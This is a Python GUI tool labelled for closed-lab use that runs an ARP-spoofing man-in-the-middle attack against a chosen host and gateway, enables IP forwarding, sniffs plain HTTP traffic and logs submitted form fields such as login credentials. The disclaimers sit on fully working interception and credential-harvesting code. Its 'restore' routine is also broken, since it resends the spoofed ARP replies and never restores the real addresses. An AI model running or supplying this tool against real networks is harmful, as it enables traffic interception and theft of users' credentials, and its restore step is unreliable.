#!/usr/bin/env python3
"""
LAB-HTTP-ANALYZER
=================
Closed-lab HTTP traffic analyzer. For use ONLY on an isolated lab network
(VMs you own, host-only/NAT-lab adapters). Do NOT run on shared/live networks.

Modes:
  1. PASSIVE SNIFF   - observe HTTP on your lab interface (no spoofing)
  2. ARP LAB CAPTURE - ARP-redirect a lab VM's traffic through this host
  3. LOG PARSE       - summarize a captured log file
  4. LIVE HTTP PROBE - fetch a lab URL and log request/response headers

All output is appended to logs/session_<timestamp>.log
"""

import os
import sys
import time
import json
import queue
import threading
import datetime
import subprocess
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog

# ---- optional deps (fail gracefully in GUI) ----
try:
    from scapy.all import sniff, ARP, send, IP, TCP, Raw, get_if_list
    SCAPY_OK = True
except Exception:
    SCAPY_OK = False

try:
    import requests
    REQUESTS_OK = True
except Exception:
    REQUESTS_OK = False


LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
os.makedirs(LOG_DIR, exist_ok=True)


class LabAnalyzerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Lab HTTP Analyzer — CLOSED LAB ONLY")
        self.root.geometry("980x680")

        self.log_path = os.path.join(
            LOG_DIR, f"session_{datetime.datetime.now():%Y%m%d_%H%M%S}.log"
        )
        self.ui_queue = queue.Queue()
        self.sniff_thread = None
        self.arp_thread = None
        self.stop_event = threading.Event()

        self._build_ui()
        self._pump_queue()
        self.log("SESSION START", f"log file: {self.log_path}")
        self.log("SAFETY", "Closed-lab use only. Do not run on shared networks.")

    # ---------------- UI ----------------
    def _build_ui(self):
        top = ttk.Frame(self.root, padding=8)
        top.pack(fill="x")

        ttk.Label(top, text="Interface:").pack(side="left")
        self.iface_var = tk.StringVar(value=(get_if_list()[0] if SCAPY_OK and get_if_list() else "wlan0"))
        self.iface_cb = ttk.Combobox(top, textvariable=self.iface_var,
                                     values=(get_if_list() if SCAPY_OK else []), width=18)
        self.iface_cb.pack(side="left", padx=(4, 12))

        ttk.Label(top, text="BPF filter:").pack(side="left")
        self.filter_var = tk.StringVar(value="tcp port 80")
        ttk.Entry(top, textvariable=self.filter_var, width=22).pack(side="left", padx=(4, 12))

        ttk.Label(top, text="Target VM IP:").pack(side="left")
        self.target_var = tk.StringVar(value="192.168.117.50")
        ttk.Entry(top, textvariable=self.target_var, width=16).pack(side="left", padx=(4, 12))

        ttk.Label(top, text="Gateway IP:").pack(side="left")
        self.gw_var = tk.StringVar(value="192.168.117.1")
        ttk.Entry(top, textvariable=self.gw_var, width=16).pack(side="left")

        btns = ttk.Frame(self.root, padding=(8, 0))
        btns.pack(fill="x")

        self.btn_passive = ttk.Button(btns, text="1) Passive Sniff", command=self.mode_passive)
        self.btn_passive.pack(side="left", padx=4, pady=6)

        self.btn_arp = ttk.Button(btns, text="2) ARP Lab Capture", command=self.mode_arp)
        self.btn_arp.pack(side="left", padx=4)

        self.btn_parse = ttk.Button(btns, text="3) Parse Log", command=self.mode_parse)
        self.btn_parse.pack(side="left", padx=4)

        self.btn_probe = ttk.Button(btns, text="4) HTTP Probe", command=self.mode_probe)
        self.btn_probe.pack(side="left", padx=4)

        self.btn_stop = ttk.Button(btns, text="■ STOP", command=self.stop_all, state="disabled")
        self.btn_stop.pack(side="left", padx=(24, 4))

        ttk.Button(btns, text="Open Log", command=self.open_log).pack(side="right", padx=4)

        body = ttk.Frame(self.root, padding=8)
        body.pack(fill="both", expand=True)

        left = ttk.LabelFrame(body, text="Live output", padding=4)
        left.pack(side="left", fill="both", expand=True)
        self.out = scrolledtext.ScrolledText(left, wrap="word", height=30, font=("Menlo", 10))
        self.out.pack(fill="both", expand=True)

        right = ttk.LabelFrame(body, text="Captured form fields (lab)", padding=4)
        right.pack(side="right", fill="both", expand=True, padx=(8, 0))
        self.forms = scrolledtext.ScrolledText(right, wrap="word", height=30, font=("Menlo", 10))
        self.forms.pack(fill="both", expand=True)

        self.status = tk.StringVar(value="Idle")
        ttk.Label(self.root, textvariable=self.status, relief="sunken",
                  anchor="w", padding=4).pack(fill="x", side="bottom")

    # ---------------- logging ----------------
    def log(self, tag, msg):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] [{tag}] {msg}"
        with open(self.log_path, "a", encoding="utf-8") as f:
            f.write(line + "\n")
        self.ui_queue.put(("out", line))

    def log_form(self, url, fields):
        ts = datetime.datetime.now().strftime("%H:%M:%S")
        entry = {"ts": ts, "url": url, "fields": fields}
        with open(self.log_path, "a", encoding="utf-8") as f:
            f.write(f"[{ts}] [FORM] {json.dumps(entry, ensure_ascii=False)}\n")
        pretty = f"[{ts}] POST {url}\n" + "\n".join(f"    {k} = {v}" for k, v in fields.items())
        self.ui_queue.put(("form", pretty))

    def _pump_queue(self):
        try:
            while True:
                kind, text = self.ui_queue.get_nowait()
                widget = self.out if kind == "out" else self.forms
                widget.insert("end", text + "\n")
                widget.see("end")
        except queue.Empty:
            pass
        self.root.after(150, self._pump_queue)

    def open_log(self):
        subprocess.Popen(["xdg-open", self.log_path])

    # ---------------- helpers ----------------
    def _set_running(self, running):
        state = "disabled" if running else "normal"
        for b in (self.btn_passive, self.btn_arp, self.btn_parse, self.btn_probe):
            b.configure(state=state)
        self.btn_stop.configure(state="normal" if running else "disabled")
        self.status.set("Running…" if running else "Idle")

    def stop_all(self):
        self.stop_event.set()
        self.log("STOP", "stop requested")
        self._set_running(False)

    @staticmethod
    def _extract_http(pkt):
        """Return (src, dst, payload_text) for a plain HTTP packet, else None."""
        if IP not in pkt or TCP not in pkt or Raw not in pkt:
            return None
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport
        if dport not in (80, 8080) and sport not in (80, 8080):
            return None
        try:
            text = bytes(pkt[Raw].load).decode("utf-8", errors="replace")
        except Exception:
            return None
        if not (text.startswith(("GET ", "POST ", "PUT ", "HEAD ", "HTTP/"))):
            return None
        return (pkt[IP].src, pkt[IP].dst, text)

    @staticmethod
    def _parse_form_fields(http_text):
        """Very small application/x-www-form-urlencoded parser for lab demos."""
        if not http_text.startswith("POST"):
            return None
        if "\r\n\r\n" not in http_text:
            return None
        headers, _, body = http_text.partition("\r\n\r\n")
        if "application/x-www-form-urlencoded" not in headers.lower():
            return None
        first = headers.split("\r\n", 1)[0]
        fields = {}
        for pair in body.split("&"):
            if "=" in pair:
                k, v = pair.split("=", 1)
                fields[k] = v
        return (first, fields)

    # ---------------- MODE 1: passive sniff ----------------
    def mode_passive(self):
        if not SCAPY_OK:
            messagebox.showerror("Missing scapy", "pip install scapy")
            return
        iface = self.iface_var.get().strip()
        bpf = self.filter_var.get().strip() or "tcp port 80"
        self.stop_event.clear()
        self._set_running(True)
        self.log("MODE1", f"passive sniff on {iface} filter='{bpf}'")

        def run():
            def on_pkt(pkt):
                if self.stop_event.is_set():
                    return
                info = self._extract_http(pkt)
                if not info:
                    return
                src, dst, text = info
                first = text.split("\r\n", 1)[0]
                self.log("HTTP", f"{src} -> {dst} : {first}")
                parsed = self._parse_form_fields(text)
                if parsed:
                    url, fields = parsed
                    self.log_form(url, fields)
            try:
                sniff(iface=iface, filter=bpf, prn=on_pkt,
                      stop_filter=lambda p: self.stop_event.is_set(), store=False)
            except Exception as e:
                self.ui_queue.put(("out", f"[ERR] {e}"))
            finally:
                self.ui_queue.put(("out", "[MODE1] stopped"))

        self.sniff_thread = threading.Thread(target=run, daemon=True)
        self.sniff_thread.start()

    # ---------------- MODE 2: ARP lab capture ----------------
    def mode_arp(self):
        if not SCAPY_OK:
            messagebox.showerror("Missing scapy", "pip install scapy")
            return
        iface = self.iface_var.get().strip()
        target = self.target_var.get().strip()
        gw = self.gw_var.get().strip()
        if not target or not gw:
            messagebox.showerror("Input", "Target VM IP and Gateway IP required")
            return
        if not messagebox.askyesno(
            "Closed-lab confirm",
            f"ARP redirect {target} <-> {gw} on {iface}?\n\n"
            "Run ONLY on an isolated lab network you own."
        ):
            return

        self.stop_event.clear()
        self._set_running(True)
        self.log("MODE2", f"ARP lab capture target={target} gw={gw} iface={iface}")

        def poison():
            # enable forwarding once (lab host is the router)
            try:
                subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                               check=False, capture_output=True)
            except Exception:
                pass
            t_mac = None
            g_mac = None
            while not self.stop_event.is_set():
                try:
                    send(ARP(op=2, pdst=target, psrc=gw), iface=iface, verbose=False)
                    send(ARP(op=2, pdst=gw, psrc=target), iface=iface, verbose=False)
                except Exception as e:
                    self.ui_queue.put(("out", f"[ARP ERR] {e}"))
                    break
                time.sleep(1.5)
            # restore
            for _ in range(4):
                try:
                    send(ARP(op=2, pdst=target, psrc=gw), iface=iface, verbose=False)
                    send(ARP(op=2, pdst=gw, psrc=target), iface=iface, verbose=False)
                except Exception:
                    pass
                time.sleep(0.4)
            self.ui_queue.put(("out", "[MODE2] ARP restored"))

        def capture():
            def on_pkt(pkt):
                if self.stop_event.is_set():
                    return
                info = self._extract_http(pkt)
                if not info:
                    return
                src, dst, text = info
                first = text.split("\r\n", 1)[0]
                self.log("HTTP", f"{src} -> {dst} : {first}")
                parsed = self._parse_form_fields(text)
                if parsed:
                    url, fields = parsed
                    self.log_form(url, fields)
            try:
                sniff(iface=iface, filter="tcp port 80", prn=on_pkt,
                      stop_filter=lambda p: self.stop_event.is_set(), store=False)
            except Exception as e:
                self.ui_queue.put(("out", f"[SNIFF ERR] {e}"))
            finally:
                self.ui_queue.put(("out", "[MODE2] sniffer stopped"))

        self.arp_thread = threading.Thread(target=poison, daemon=True)
        self.sniff_thread = threading.Thread(target=capture, daemon=True)
        self.arp_thread.start()
        self.sniff_thread.start()

    # ---------------- MODE 3: parse log ----------------
    def mode_parse(self):
        path = filedialog.askopenfilename(
            initialdir=LOG_DIR, title="Select a session log",
            filetypes=[("Log files", "*.log"), ("All files", "*.*")]
        )
        if not path:
            return
        self.log("MODE3", f"parsing {path}")
        counts = {"HTTP": 0, "FORM": 0}
        try:
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    if "[HTTP]" in line:
                        counts["HTTP"] += 1
                    elif "[FORM]" in line:
                        counts["FORM"] += 1
                        self.ui_queue.put(("form", line.rstrip()))
            self.log("MODE3", f"HTTP lines={counts['HTTP']} FORM lines={counts['FORM']}")
        except Exception as e:
            self.log("MODE3-ERR", str(e))

    # ---------------- MODE 4: live HTTP probe ----------------
    def mode_probe(self):
        if not REQUESTS_OK:
            messagebox.showerror("Missing requests", "pip install requests")
            return
        from tkinter import simpledialog
        url = simpledialog.askstring("HTTP probe", "Lab URL to fetch (http://…):")
        if not url:
            return
        if not url.startswith("http://"):
            messagebox.showwarning("Lab only", "Use a plain http:// URL on your lab network.")
            return

        def run():
            try:
                r = requests.get(url, timeout=8, allow_redirects=False)
                self.log("MODE4", f"GET {url} -> {r.status_code} ({len(r.content)} bytes)")
                for k, v in r.headers.items():
                    self.ui_queue.put(("out", f"    {k}: {v}"))
            except Exception as e:
                self.log("MODE4-ERR", str(e))

        self._set_running(True)
        threading.Thread(target=run, daemon=True).start()
        self.root.after(1200, lambda: self._set_running(False))


def main():
    root = tk.Tk()
    app = LabAnalyzerApp(root)
    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_all(), root.destroy()))
    root.mainloop()


if __name__ == "__main__":
    main()
